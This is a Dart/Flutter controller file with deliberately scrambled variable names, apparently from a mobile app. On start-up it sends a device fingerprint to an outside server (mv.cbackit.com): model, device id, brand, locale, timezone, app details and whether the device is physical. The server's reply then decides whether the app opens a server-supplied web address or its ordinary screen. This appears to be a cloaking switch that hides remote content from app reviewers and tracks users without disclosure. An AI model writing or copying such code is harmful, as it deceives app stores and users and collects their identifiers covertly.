import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class FreqHomeLogic extends GetxController {

  var ksjfnaw = RxBool(false);
  var tjfmqxbr = RxBool(true);
  var vkcz = RxString("");
  var jennie = RxBool(false);
  var stamm = RxBool(true);
  final yzupkaw = Dio();


  InAppWebViewController? webViewController;

  dynamic yshopqf(){
    final drbvlnuo = InternetConnectionChecker.instance;
    final zeovam = drbvlnuo.onStatusChange.skip(1).listen(
          (InternetConnectionStatus lbxrztaq) {
        if (lbxrztaq == InternetConnectionStatus.connected) {
          dqvlzmu();
        } else {
          Get.toNamed('/freq_wrong')?.then((_){
            dqvlzmu();
          });
        }
      },
    );
    return zeovam;
  }

  Future<bool> yuwacspzoj() async {
    var armnlht = await InternetConnectionChecker.instance.hasConnection;
    if(!armnlht){
      Get.toNamed('/freq_wrong')?.then((_){
        dqvlzmu();
      });
    }
    return armnlht;
  }

  @override
  void onInit() {
    super.onInit();
    yshopqf();
    dqvlzmu();
  }


  Future<void> dqvlzmu() async {

    var nlxqyf = await yuwacspzoj();
    if(!nlxqyf){
      return;
    }

    jennie.value = true;
    stamm.value = true;
    tjfmqxbr.value = false;

    yzupkaw.post("https://mv.cbackit.com/exjuqfvlygistko",data: await jtkfxuwi()).then((value) {
      var xysalcop = value.data["xysalcop"] as String;
      var sdwbtxml = value.data["sdwbtxml"] as bool;
      if (sdwbtxml) {
        vkcz.value = xysalcop;
        general();
      } else {
        von();
      }
    }).catchError((e) {
      tjfmqxbr.value = true;
      stamm.value = true;
      jennie.value = false;
    });
  }

  Future<Map<String, dynamic>> jtkfxuwi() async {
    final DeviceInfoPlugin uwehv = DeviceInfoPlugin();
    PackageInfo wnebxdhk_mxkyso = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var koruqadp = Platform.localeName;
    var crlq = currentTimeZone;

    var exrgtp = wnebxdhk_mxkyso.packageName;
    var amdli = wnebxdhk_mxkyso.version;
    var ferxyh = wnebxdhk_mxkyso.buildNumber;

    var fudqew = wnebxdhk_mxkyso.appName;
    var qwhpvoc = "";
    var lypcrqsi  = "";
    var hcbym = "";
    var rubieMosciski = "";
    var jeremieTromp = "";
    var cortneySchuppe = "";
    var arthurBraun = "";


    var hxrwmva = "";
    var bkflqte = false;

    if (GetPlatform.isAndroid) {
      hxrwmva = "android";
      var bpegmlx = await uwehv.androidInfo;

      hcbym = bpegmlx.brand;

      qwhpvoc  = bpegmlx.model;
      lypcrqsi = bpegmlx.id;

      bkflqte = bpegmlx.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hxrwmva = "ios";
      var jazwvcyo = await uwehv.iosInfo;
      hcbym = jazwvcyo.name;
      qwhpvoc = jazwvcyo.model;

      lypcrqsi = jazwvcyo.identifierForVendor ?? "";
      bkflqte  = jazwvcyo.isPhysicalDevice;
    }
    var res = {
      "fudqew": fudqew,
      "ferxyh": ferxyh,
      "exrgtp": exrgtp,
      "rubieMosciski" : rubieMosciski,
      "qwhpvoc": qwhpvoc,
      "arthurBraun" : arthurBraun,
      "crlq": crlq,
      "hxrwmva": hxrwmva,
      "hcbym": hcbym,
      "lypcrqsi": lypcrqsi,
      "koruqadp": koruqadp,
      "bkflqte": bkflqte,
      "amdli": amdli,
      "jeremieTromp" : jeremieTromp,
      "cortneySchuppe" : cortneySchuppe,

    };
    return res;
  }

  Future<void> von() async {
    Get.offNamed("/freq_tab");
  }

  Future<void> general() async {
    Get.offNamed("/freq_speed");
  }

  @override
  void dispose() {
    yshopqf().cancel();
    super.dispose();
  }

}
